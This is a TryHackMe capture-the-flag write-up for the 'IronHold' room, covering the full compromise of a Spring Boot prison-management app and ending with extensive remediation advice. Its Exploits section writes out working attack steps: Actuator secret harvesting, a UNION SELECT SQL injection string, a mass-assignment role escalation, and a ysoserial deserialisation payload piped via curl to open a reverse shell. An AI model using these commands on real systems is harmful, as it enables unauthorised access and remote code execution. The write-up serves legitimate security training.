# IronHold Challenge

![Banner](./../IMAGES/ironhold_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[IronHold](https://tryhackme.com/room/ironhold)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **30 July 2026**.
>
> **Spoiler warning:** This write-up documents the complete attack chain. Credentials, exact challenge-specific values, sensitive environment data, session identifiers, dynamically generated container identifiers and exact flag codes have been redacted.
>
> **Please note:** The target IP address was dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, account names, sensitive source values, record identifiers, hashes, session identifiers, payload content or other direct challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the work of the TryHackMe team and the wider cyber security community, who continue to create practical environments for learning offensive and defensive security.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on laboratories covering penetration testing, networking, web application security, privilege escalation, Active Directory and defensive security.

## Lab Summary

IronHold is a source-assisted web application challenge based on a retiring correctional facility management platform. The complete application repository was provided alongside a live deployment, allowing the source code to be reviewed and its assumptions tested against the running service.

The challenge required four flags to be collected in the following order:

1. The flag displayed on the officer dashboard after obtaining initial access.
2. The flag stored in a database record that was not exposed by any normal page.
3. The flag displayed on the warden-only door-control panel.
4. The flag stored on the facility server after achieving remote command execution.

The successful attack chain involved:

1. Confirming VPN routing, hostname resolution and application reachability.
2. Enumerating the exposed SSH and web services.
3. Discovering an exposed Spring Boot Actuator interface.
4. Reviewing the leaked source code and application configuration.
5. Recovering an unsanitised shared login secret from `/actuator/env`.
6. Authenticating to the application and collecting the first flag.
7. Tracing a seeded secret into a hidden database record.
8. Exploiting SQL injection in the inmate search function with a three-column `UNION SELECT`.
9. Collecting the second flag from the injected query result.
10. Exploiting an over-posting or mass-assignment flaw in the profile update handler.
11. Changing the authenticated account's stored role to `WARDEN`.
12. Accessing the warden-only control panel and collecting the third flag.
13. Identifying unsafe Java deserialisation in the administrative import feature.
14. Confirming that a vulnerable Apache Commons Collections dependency was present.
15. Building `ysoserial`, generating a compatible gadget payload and sending it to the import endpoint.
16. Receiving a reverse shell through the Kali `tun0` interface.
17. Locating and reading the final flag from the facility server.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: ironhold.thm
Application URL: http://ironhold.thm:8080/
```

The mapping was confirmed with:

```bash
getent hosts ironhold.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using a personal Kali Linux VM, `/etc/hosts` is especially important for TryHackMe challenges. Some rooms rely on hostname-based routing, redirects, cookies, virtual hosts, certificates or application logic that will not behave correctly when the intended hostname is missing.
>
> Over time, `/etc/hosts` can become clogged with stale entries from completed rooms. It is advantageous to keep the file clear, tidy and limited to the challenge currently being worked on.
>
> A hosts file full of old lab mappings eventually becomes DNS archaeology - every line tells a story, but not necessarily the right one.

The file can be reviewed with:

```bash
cat /etc/hosts
```

A stale IronHold entry can be removed with:

```bash
sudo sed -i '/ironhold\.thm/d' /etc/hosts
```

The current target can then be added again using `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip`, `getent` and `ping` for VPN routing, hostname resolution and connectivity checks.
- Nmap and RustScan for port discovery, service detection and default script enumeration.
- WhatWeb for basic web technology identification.
- Dirsearch, Feroxbuster and FFUF for content discovery.
- `curl` for interacting with the login form, Actuator endpoints, authenticated pages and vulnerable application routes.
- `jq` for parsing the Spring Boot Actuator environment response.
- `grep`, `sed` and `cat` for reviewing the leaked Java source and templates.
- Maven and Java 11 for building and running `ysoserial`.
- `ysoserial` for generating a Java deserialisation gadget payload.
- Netcat for receiving the reverse shell.
- Standard Linux utilities including `find`, `ls`, `id`, `whoami`, `pwd` and `base64`.

Click [Tools Commonly Used](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

Nmap was used for service detection and default script enumeration:

```bash
nmap -sC -sV -Pn ironhold.thm
```

RustScan was also used to confirm the exposed TCP ports:

```bash
rustscan -b 500 -a ironhold.thm --top -- -sC -sV -Pn
```

Two services were exposed:

```text
22/tcp    OpenSSH
8080/tcp  Apache Tomcat / Java web application
```

The web service presented the IronHold staff login page.

### Web Technology Identification

WhatWeb identified a Java application using a `JSESSIONID` cookie:

```bash
whatweb -a 1 ironhold.thm:8080
```

Relevant observations included:

```text
HTTP status: 200
Technology: Java
Session cookie: JSESSIONID
Authentication form: username and password
Page title: Ironhold Correctional | Staff Login
```

### Content Discovery

Several discovery tools were used against port `8080`.

Dirsearch:

```bash
dirsearch -u ironhold.thm:8080/
```

Feroxbuster:

```bash
feroxbuster \
  -u http://ironhold.thm:8080/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

FFUF:

```bash
ffuf \
  -u 'http://ironhold.thm:8080/FUZZ' \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc all \
  -t 100 \
  -ic \
  -fc 404,302 \
  -e .php,.txt,.html,.py
```

The most important discovery was the exposed Spring Boot Actuator base path:

```text
/actuator
```

Several Actuator endpoints returned HTTP `200`, including:

```text
/actuator/env
/actuator/beans
/actuator/mappings
/actuator/configprops
/actuator/conditions
/actuator/health
/actuator/loggers
/actuator/metrics
```

The public `/status` page also explicitly referenced `/actuator` as the location of technical diagnostics.

### Reviewing the Leaked Source

The supplied source archive contained a Spring Boot application with controllers, models, repositories, security interceptors, seed data, templates and configuration files.

The project layout was reviewed with:

```bash
ls -R src
```

The application configuration was then inspected:

```bash
cat src/main/resources/application.properties
```

The important configuration pattern was:

```properties
management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=heapdump,threaddump

app.kiosk.pw=${KIOSK_PW}
app.warden.password=${WARDEN_PASSWORD}
app.flag1.secret=${FLAG1_SECRET}
app.flag2.secret=${FLAG2_SECRET}
app.flag3.secret=${FLAG3_SECRET}
```

This showed that:

- All Actuator web endpoints were exposed except two explicitly excluded endpoints.
- A shared login secret was loaded from an environment variable.
- The warden password and three challenge flags were also supplied through environment variables.
- Sensitive values might therefore be visible through `/actuator/env` if sanitisation was incomplete.

## Exploits

### Exposed Actuator Environment and Initial Credentials

The Actuator environment was queried and filtered for application secrets:

```bash
curl -s http://ironhold.thm:8080/actuator/env |
  jq '.. | objects |
      with_entries(
        select(.key | test("kiosk|KIOSK|warden|WARDEN|flag|FLAG"; "i"))
      ) |
      select(length > 0)'
```

Sensitive values such as the warden password and flags were masked. However, the shared kiosk password was returned in plaintext:

```text
KIOSK_PW: <REDACTED>
app.kiosk.pw: <REDACTED>
```

This was an important distinction: Spring's sanitisation protected some key names but did not mask the custom kiosk property.

The source was searched for the username paired with that password:

```bash
grep -RniE 'kiosk|username|login' \
  src/main/java/com/ironhold/{controller,seed,security}
```

The seed code showed that the shared account used:

```text
Username: <REDACTED>
Password: <REDACTED>
Role: OFFICER
```

### Authenticating to the Officer Dashboard

The credentials were submitted with `curl`, while the authenticated session cookie was saved locally:

```bash
curl -i -s \
  -c cookies.txt \
  -b cookies.txt \
  -X POST \
  http://ironhold.thm:8080/login \
  --data-urlencode 'username=<REDACTED>' \
  --data-urlencode 'password=<REDACTED>'
```

A successful login returned an HTTP `302` redirect to the dashboard:

```text
HTTP/1.1 302
Set-Cookie: JSESSIONID=<REDACTED>
Location: http://ironhold.thm:8080/dashboard;jsessionid=<REDACTED>
```

The dashboard was then requested with the stored session:

```bash
curl -s -b cookies.txt http://ironhold.thm:8080/dashboard
```

The first flag appeared inside a shift-handover notice:

```text
1. Officer dashboard flag: THM{....}
```

This completed the initial-access stage.

### Tracing the Hidden Database Flag

The second question described a flag in a record that no page would display. The source was searched to determine where the second secret was seeded:

```bash
grep -RniE 'flag[123]|secret' src/main/java
```

The seed code showed that the second flag was inserted into the `summary` column of a `case_files` record:

```java
jdbcTemplate.update(
    "INSERT INTO case_files (case_number, title, summary, status, opened_at) VALUES (?, ?, ?, ?, ?)",
    "<REDACTED>",
    "<REDACTED>",
    flag2,
    "OPEN",
    LocalDateTime.now().minusMonths(3)
);
```

The application contained no normal page that exposed this record. The next step was therefore to identify a database query that could be influenced.

### SQL Injection in Inmate Search

The inmate controller constructed a SQL statement by concatenating the `q` parameter directly into the query:

```java
String sql =
    "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";
results = jdbcTemplate.queryForList(sql);
```

This was a classic SQL injection vulnerability.

The template displayed exactly three result columns:

```text
ID
NAME
BLOCK
```

A `UNION SELECT` therefore had to return three compatible columns. The hidden `summary` value could be placed into the displayed `BLOCK` column.

The vulnerable route was queried using the saved authenticated session:

```bash
curl -s \
  -b cookies.txt \
  --get \
  http://ironhold.thm:8080/inmates/search \
  --data-urlencode \
  "q=' UNION SELECT 0, title, summary FROM case_files WHERE case_number='<REDACTED>'-- -" |
  grep -oE 'THM\{[^}]+\}'
```

The result contained the second flag:

```text
2. Hidden database record flag: THM{....}
```

The flag was recovered because:

1. The injected query matched the original three-column result.
2. The record title was returned as `NAME`.
3. The hidden summary was returned as `BLOCK`.
4. Thymeleaf rendered the resulting map without distinguishing rows from the original table and rows from the injected table.

### Mass Assignment Through Profile Update

The warden-only panel was protected by an interceptor that checked the role stored in the current staff record:

```java
Staff staff = staffRepository.findByUsername(username);

if (staff == null || !staff.isWarden()) {
    response.sendError(
        HttpServletResponse.SC_FORBIDDEN,
        "Warden clearance required"
    );
    return false;
}
```

The profile update controller accepted a complete `Staff` object through `@ModelAttribute` and copied a submitted role into the authenticated record:

```java
if (staff.getRole() != null && !staff.getRole().isBlank()) {
    current.setRole(staff.getRole());
}
```

The normal interface did not need to expose a role field for the controller to accept one. An extra `role` parameter could simply be added to the POST request.

The authenticated account was updated with:

```bash
curl -i -s \
  -b cookies.txt \
  -c cookies.txt \
  -X POST \
  http://ironhold.thm:8080/profile/update \
  --data-urlencode 'fullName=<REDACTED>' \
  --data-urlencode 'email=<REDACTED>' \
  --data-urlencode 'badgeNumber=<REDACTED>' \
  --data-urlencode 'role=WARDEN'
```

The application returned:

```text
HTTP/1.1 302
Location: http://ironhold.thm:8080/profile
```

Because the interceptor reloaded the current user from the database on each protected request, the existing session immediately inherited the newly stored `WARDEN` role.

### Warden Door-Control Panel

The administrative control page was requested with the same authenticated session:

```bash
curl -s \
  -b cookies.txt \
  http://ironhold.thm:8080/admin/control |
  grep -oE 'THM\{[^}]+\}'
```

The third flag was displayed on the warden's door-control panel:

```text
3. Warden door-control flag: THM{....}
```

This stage demonstrated that server-side authorisation was present, but the integrity of the authorisation data was not protected.

### Unsafe Java Deserialisation

The administrative import controller accepted an arbitrary request body, Base64-decoded it and passed the bytes directly to `ObjectInputStream.readObject()`:

```java
byte[] decoded = Base64.getDecoder().decode(body.trim());

try (ObjectInputStream ois =
         new ObjectInputStream(new ByteArrayInputStream(decoded))) {
    Object restored = ois.readObject();
}
```

This is unsafe because Java deserialisation can invoke methods in classes already available on the application's classpath.

The Maven configuration was reviewed:

```bash
cat pom.xml
```

A vulnerable Apache Commons Collections 3.2.x dependency was present:

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>[3.2,3.2.2)</version>
</dependency>
```

This provided a compatible gadget library for a deserialisation payload.

### Building ysoserial

No existing `ysoserial` JAR was found:

```bash
find /opt /usr/share /tmp \
  -type f \
  -iname '*ysoserial*.jar' \
  2>/dev/null
```

The official repository was cloned:

```bash
cd /tmp/VK/
git clone https://github.com/frohoff/ysoserial.git
```

Maven was installed because it was not initially present:

```bash
apt update
apt install -y maven
```

The available Java runtimes were checked:

```bash
update-alternatives --list java
```

Java 11 was used explicitly for compatibility. The project initially attempted to compile with obsolete Java 6 source and target settings, so those values were overridden with Java 8 compatibility:

```bash
cd /tmp/VK/ysoserial

JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 \
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH \
mvn clean package \
  -DskipTests \
  -Dmaven.compiler.source=8 \
  -Dmaven.compiler.target=8
```

The build completed successfully and produced:

```text
/tmp/VK/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
```

The available Commons Collections payloads were checked with:

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar /tmp/VK/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar \
  2>&1 |
  grep CommonsCollections
```

A compatible gadget chain was available.

### Payload Encoding and Delivery

A Netcat listener was started on the Kali VPN interface:

```bash
nc -lvnp 4444
```

The reverse-shell command was first Base64-encoded locally. This encoding step was used to reduce problems caused by shell metacharacters, redirection operators and quoting inside the gadget command:

```bash
printf '<REDACTED>' | base64 -w0
```

The encoded command was then wrapped in a small decoder expression that would:

1. Echo the Base64 text on the target.
2. Decode it with `base64 -d`.
3. Pass the decoded command to Bash.

`ysoserial` generated the serialised object. The binary serialised output was then Base64-encoded again because `/admin/import` expected a Base64 request body:

```bash
CMD=$(printf '<REDACTED>' | base64 -w0)

/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar /tmp/VK/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar \
  <REDACTED> \
  "bash -c {echo,$CMD}|{base64,-d}|{bash,-i}" |
  base64 -w0 |
  curl -i -s \
    -b /tmp/VK/cookies.txt \
    -H 'Content-Type: text/plain' \
    --data-binary @- \
    http://ironhold.thm:8080/admin/import
```

There were therefore two distinct Base64 operations:

- The reverse-shell command was encoded to preserve its special characters.
- The generated Java serialisation stream was encoded because the import endpoint decoded Base64 before deserialising it.

Base64 did not provide security in either case. It was only a transport encoding.

### Reverse Shell

The Netcat listener received a connection from `<TARGET_IP>`:

```text
connect to [<TUN0_IP>] from (UNKNOWN) [<TARGET_IP>] <REDACTED>
bash: no job control in this shell
appuser@<REDACTED>:/app$
```

The execution context was checked:

```bash
id
whoami
pwd
ls
```

The shell was running as:

```text
User: appuser
Working directory: /app
Application file: app.jar
Container identifier: <REDACTED>
```

### Final Flag on the Facility Server

The filesystem was searched for likely flag files:

```bash
find / \
  -type f \
  \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) \
  2>/dev/null
```

The final flag file was located at:

```text
/opt/ironhold/flag.txt
```

It was read with:

```bash
cat /opt/ironhold/flag.txt
```

The fourth and final answer was:

```text
4. Facility server flag: THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The dynamically allocated target was mapped to `ironhold.thm` in `/etc/hosts`. Routing checks confirmed that traffic to `<TARGET_IP>` used the TryHackMe VPN and originated from `<TUN0_IP>`.

### 2. Service Discovery
Nmap and RustScan identified SSH on port `22` and a Java web application on port `8080`. WhatWeb confirmed a Java application using `JSESSIONID`.

### 3. Actuator Discovery
Directory enumeration and the public status page revealed `/actuator`. Multiple sensitive Spring Boot Actuator endpoints were available without authentication, including `/actuator/env`.

### 4. Source Review
The leaked repository showed that a shared account password, the warden password and three flags were loaded from environment variables. It also showed that all Actuator web endpoints were exposed except heap and thread dumps.

### 5. Initial Secret Disclosure
`/actuator/env` masked several sensitive values but returned the custom shared-login password in plaintext. The matching username was recovered from the application seed code.

```text
Username: <REDACTED>
Password: <REDACTED>
```

### 6. Officer Dashboard Flag
The recovered credentials were submitted to `/login`. The server returned an authenticated `JSESSIONID`, and the first flag was found inside a dashboard notice:

```text
THM{....}
```

### 7. Hidden Record Identification
Source review showed that the second flag was stored in the `summary` column of a seeded `case_files` record. No normal route displayed that record.

### 8. SQL Injection
The inmate search route concatenated the `q` parameter into a SQL query. A three-column `UNION SELECT` matched the original `id`, `name` and `block` structure and returned the hidden case-file summary through the visible results table.

The second flag was:

```text
THM{....}
```

### 9. Role Manipulation
The profile update route accepted a `Staff` model and copied a submitted `role` value into the authenticated user's database record. Adding `role=WARDEN` to the request upgraded the shared account.

### 10. Warden Panel Access
The authorisation interceptor reloaded the modified record and accepted the new role. The warden-only control panel then displayed the third flag:

```text
THM{....}
```

### 11. Deserialisation Vulnerability
The administrative import endpoint Base64-decoded an untrusted request body and passed it directly to `ObjectInputStream.readObject()`. The application also included a vulnerable Commons Collections library.

### 12. Payload Generation
`ysoserial` was built with Java 11 and Java 8 compiler settings. A compatible Commons Collections gadget payload was generated.

### 13. Encoded Payload Delivery
The reverse-shell command was Base64-encoded to preserve shell syntax. The generated binary Java object was separately Base64-encoded to satisfy the import endpoint's input format.

### 14. Remote Command Execution
The payload was sent to `/admin/import` using the authenticated warden session. The target connected back to the Netcat listener on `<TUN0_IP>:4444`, providing a shell as `appuser`.

### 15. Final Flag
The filesystem search identified `/opt/ironhold/flag.txt`. Reading the file returned the fourth flag:

```text
THM{....}
```

### 16. Completed Flag Order
The answers were collected in the same order as the challenge questions:

```text
1. Officer dashboard: THM{....}
2. Hidden database record: THM{....}
3. Warden door-control panel: THM{....}
4. Facility server: THM{....}
```

## Key Lessons

IronHold demonstrated how several weaknesses can be chained into a complete compromise:

- Confirm VPN routing and hostname resolution before investigating application behaviour.
- Keep `/etc/hosts` tidy and limited to the active TryHackMe room.
- A leaked source repository can provide an attacker with routes, secrets, data models and security assumptions.
- Source review should be paired with testing against the live application rather than treated as proof on its own.
- Spring Boot Actuator endpoints should never be broadly exposed to untrusted networks.
- Custom property names may bypass incomplete secret-sanitisation rules.
- Environment variables are not safe merely because they are outside the source repository.
- Shared kiosk or service accounts expand the impact of a single disclosed password.
- Authentication success does not mean the rest of the application is securely authorised.
- SQL queries must never be built by concatenating untrusted input.
- Matching the column count and types is essential when testing a `UNION SELECT` condition.
- Data that is absent from the normal interface may still be reachable through another query path.
- Binding a complete domain object to a profile form can expose fields the interface never intended users to control.
- Role and privilege fields must be controlled exclusively by trusted server-side logic.
- Re-checking a user's role on every request is ineffective when the user can modify the stored role.
- Java native deserialisation is dangerous when applied to attacker-controlled data.
- A gadget chain only needs suitable classes already present on the target classpath.
- Dependency versions are part of the attack surface and should be reviewed during source analysis.
- Base64 is an encoding format, not encryption or access control.
- Reverse-shell payloads may require careful encoding to survive multiple parsers and shells.
- A `500` response from a deserialisation endpoint does not prove that the payload failed; execution may occur before the application reports the exception.
- File discovery should be systematic rather than based on assumed filenames.
- Public write-ups should preserve the methodology while withholding credentials, exact flags and direct challenge giveaways.

The central lesson was not any one vulnerability. The compromise succeeded because information disclosure, SQL injection, unsafe object binding, broken privilege control and unsafe deserialisation were chained together. Each flaw opened the route to the next.

## Remediation Notes

### Source Code and Repository Security

- Keep application repositories private unless public release is intentional and reviewed.
- Remove secrets, test credentials and environment snapshots from version control.
- Use automated secret scanning in repositories and CI pipelines.
- Treat a leaked repository as a security incident even when passwords are stored outside the code.
- Rotate all credentials and secrets that may be inferred from leaked configuration.
- Review commit history because deleting a secret from the latest revision does not remove it from earlier commits.
- Maintain a documented process for offboarding developers and revoking access.

### Spring Boot Actuator Security

- Do not expose all Actuator endpoints with `management.endpoints.web.exposure.include=*`.
- Expose only the minimum endpoints required for operations.
- Place management endpoints on a separate internal interface or port.
- Require authentication and appropriate administrative authorisation.
- Restrict access with network controls and host firewalls.
- Disable `/env`, `/configprops`, `/beans` and `/mappings` in production unless there is a justified operational need.
- Configure sanitisation rules for custom keys such as passwords, tokens, credentials and secrets.
- Test sanitisation against the deployed application rather than relying on default behaviour.
- Monitor requests to management endpoints.

### Credential and Secret Management

- Replace shared kiosk credentials with individual user accounts or managed device authentication.
- Use long, randomly generated passwords stored in an approved secrets manager.
- Rotate credentials regularly and immediately after suspected exposure.
- Avoid displaying operational credentials in notices, logs or support pages.
- Never assume environment variables are inaccessible to the application or its diagnostics.
- Apply least privilege to service accounts.
- Record and monitor authentication by shared or non-human accounts.
- Prevent credential reuse across administrative and operational roles.

### SQL Injection Prevention

- Use parameterised queries or prepared statements for all database operations.
- Replace string concatenation with placeholders:

```java
jdbcTemplate.queryForList(
    "SELECT id, name, block FROM inmates WHERE name = ?",
    q
);
```

- Validate input according to expected type, length and character rules.
- Keep the lookup database account restricted to the minimum required tables.
- Avoid granting access to unrelated sensitive tables.
- Return generic database errors to clients.
- Log and alert on SQL syntax errors and suspicious query patterns.
- Use automated SAST, DAST and dependency scanning during development.
- Add unit and integration tests for injection payloads.

### Data Exposure and Record Separation

- Do not place challenge-equivalent secrets or administrative notes in fields accessible to operational query accounts.
- Separate sensitive case data from routine inmate-search data.
- Apply row-level and column-level access controls where supported.
- Use dedicated repositories and DTOs for each view.
- Avoid returning generic maps containing more data than the template requires.
- Review whether backend data remains accessible through alternate routes even when hidden from the user interface.
- Audit database grants regularly.

### Mass Assignment and Object Binding

- Do not bind user-controlled form data directly to persistence entities.
- Create a dedicated profile-update DTO containing only permitted fields:

```java
public class ProfileUpdateRequest {
    private String fullName;
    private String email;
    private String badgeNumber;
}
```

- Set role, username, password and account identifiers only through trusted administrative workflows.
- Use explicit allowlists for bindable fields.
- Reject unexpected parameters.
- Apply server-side authorisation before every sensitive update.
- Log changes to roles, permissions and account status.
- Require re-authentication or approval for privilege changes.
- Add tests confirming that hidden or additional form fields cannot alter protected properties.

### Role and Authorisation Controls

- Store privileged role changes behind a separate administrative endpoint.
- Require a verified warden or administrator to approve role changes.
- Use immutable or tightly controlled identifiers for the current principal.
- Consider a mature security framework rather than custom session and interceptor logic.
- Deny access by default.
- Audit all access to administrative routes.
- Alert on role changes followed immediately by access to sensitive controls.
- Invalidate or refresh sessions after legitimate privilege changes.
- Separate officer, warden and system-administration responsibilities.

### Java Deserialisation

- Do not use native Java serialisation for untrusted input.
- Replace `ObjectInputStream` with a safer, schema-driven format such as JSON.
- Define explicit request models and validate every field.
- If native deserialisation cannot be removed immediately, use an allowlist-based object input filter.
- Sign and authenticate import files before processing them.
- Reject unknown classes and unexpected object graphs.
- Run import processing in a low-privilege, isolated service.
- Apply strict request size limits.
- Remove unnecessary gadget-capable libraries from the classpath.
- Monitor deserialisation exceptions and suspicious import requests.
- Treat administrative import functions as high-risk attack surfaces.

### Dependency Management

- Replace vulnerable Apache Commons Collections releases with supported versions.
- Pin dependency versions rather than using broad version ranges.
- Generate and review a software bill of materials.
- Use tools such as OWASP Dependency-Check, Dependabot or equivalent software composition analysis.
- Remove libraries that are not required at runtime.
- Patch Spring Boot and related dependencies according to a defined maintenance schedule.
- Rebuild and redeploy after dependency changes.
- Test whether vulnerable gadget chains remain possible after upgrades.

### Container and Host Security

- Run the application as a non-root user, as IronHold did, but do not treat that as a complete containment boundary.
- Use a read-only root filesystem where practical.
- Mount only the directories required by the application.
- Keep sensitive host files outside the container.
- Apply seccomp, AppArmor or SELinux profiles.
- Drop unnecessary Linux capabilities.
- Restrict outbound network access so a compromised container cannot create arbitrary callbacks.
- Segment application containers from management systems and internal services.
- Rotate container images and remove unnecessary tools.
- Monitor unexpected child processes spawned by the Java application.

### Logging and Detection

- Log access to Actuator endpoints and administrative routes.
- Record profile changes, especially changes to roles and badges.
- Alert on suspicious SQL metacharacters in search parameters.
- Detect unexpected Java child processes such as shells, network utilities and interpreters.
- Monitor outbound connections from application containers.
- Alert on import failures followed by process creation or network callbacks.
- Retain sufficient logs to reconstruct the complete attack chain.
- Protect logs from alteration by the application account.

### Operational Hygiene

- Keep `/etc/hosts` limited to mappings required for the active room.
- Remove stale TryHackMe entries after each challenge.
- Record the current target IP, local hostname and `tun0` address before enumeration.
- Maintain a separate working directory for each room.
- Store scan results, downloaded source and generated payloads in organised subdirectories.
- Remove temporary credentials, cookies and exploit payloads when the room is complete.
- Redact IP addresses, credentials, session values, record identifiers and flags before publishing.
- Verify every command in the public write-up after redaction so placeholders do not accidentally break the explanation.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
